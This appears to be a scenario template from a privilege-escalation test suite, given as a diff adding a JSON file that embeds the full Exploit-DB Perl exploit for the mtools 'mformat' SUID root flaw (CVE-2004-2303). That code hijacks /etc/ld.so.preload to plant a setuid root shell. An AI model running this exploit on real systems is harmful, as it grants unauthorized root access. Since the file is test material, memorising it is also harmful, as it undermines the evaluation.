@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_23759",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: MTools 3.9.x - 'MFormat' Local Privilege Escalation (CVE-2004-2303;OSVDB-19802)\n\nExploit source code (23759.pl):\n```\nsource: https://www.securityfocus.com/bid/9746/info\n\nIt has been reported that mformat is prone to a privilege escalation vulnerability when installed as a setUID application. This issue is due to a design error allowing a user to create any arbitrary files as the root user.\n\nA local attacker could exploit this issue by forcing the creation of sensitive system files that already exist. When the application formats the specified files, the target system file will be overwritten, destroying sensitive system data. Since the files that are given permissions 0666 and owned by root, the attacker may alter overwritten system configuration files, allowing for a escalation of privileges.\n\n#!/usr/bin/perl\n\n#\n# mtools/mformat <= 3.9.9 local root exploit.\n# Successfully tested on a Mandrake 9.2 default install.\n# (C) 2004 krahmer@cs.uni-potsdam.de. PoC code.\n# Standard disclaimer applies. Do not use for evil purposes.\n#\n# !USE AT YOUR OWN RISK! IT MAY CRASH YOUR MACHINE!\n#\n# If something goes wrong, it helps to be logged in as root\n# on a second terminal beforehand and then doing a cat > /etc/ld.so.preload\n#\n# [stealth@lachs stealth]$ ./macker\n# [-] Checking for mformat being +s ...OK.\n# [-] Creating funky.so ...OK.\n# [-] Creating boomsh ...OK\n# [-] Calling mformat...\n# [-] Invoking boomsh ...\n# sh-2.05b# id\n# uid=0(root) gid=501(stealth) groups=501(stealth)\n# sh-2.05b#\n\n$ |= 1;\numask(0);\n\nprint \" [-] Checking for mformat being +s ...\";\nif (((stat(\"/usr/bin/mformat\"))[2] & 04000) != 04000) {\n\tprint \"mformat not SUID.\\n\";\n\texit(1);\n}\n\nprint \"OK.\\n [-] Creating funky.so ...\";\n\nopen(O, \">/tmp/funky.c\") or die \"$!\";\nprint O<<_EOF_;\nvoid _init()\n{\n\tchown(\"/tmp/boomsh\",0,0);\n\tchmod(\"/tmp/boomsh\", 04755);\n\tunlink(\"/etc/ld.so.preload\");\n}\n_EOF_\nclose(O);\nif (system(\"cc -c -fPIC /tmp/funky.c -o /tmp/funky.o &&\".\n\t   \"ld -Bshareable /tmp/funky.o -o /tmp/funky.so\")) {\n\tprint \"FAILED!\";\n\texit(1);\n}\n\nprint \"OK.\\n [-] Creating boomsh ...\";\n\nopen(O, \">/tmp/boomsh.c\") or die \"$!\";\nprint O<<_EOF_;\n#include <stdio.h>\nint main()\n{\nchar *a[]={\"/bin/sh\", NULL};\nsetuid(0); getuid(0);\nexecve(*a,a,NULL);\nreturn 1;\n}\n_EOF_\nclose(O);\n\nif (system(\"cc /tmp/boomsh.c -o /tmp/boomsh\")) {\n\tprint \"FAILED!\\n\";\n\texit(1);\n}\n\nprint \"OK\\n\";\nprint \" [-] Calling mformat...\\n\";\n\nopen(O, \">\".$ENV{HOME}.\"/.mtoolsrc\") or die $!;\nprint O \"drive+ a: file=\\\"/etc/ld.so.preload\\\"\\n\";\nclose(O);\nsystem(\"/usr/bin/mformat -t 11 -h 1 -n 1 -C a:\");\n\nopen(O, \">/etc/ld.so.preload\") or die \"Oh oh ... $!\";\nprint O \"/tmp/funky.so\\n\";\nclose(O);\nsystem(\"ping 2>/dev/null\");\nprint \" [-] Invoking boomsh ...\\n\";\nexec(\"/tmp/boomsh\");\nprint \"FAILED\\n\";\n```",
+  "cve": "CVE-2004-2303;OSVDB-19802",
+  "exploitdb_id": "23759",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_23759",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
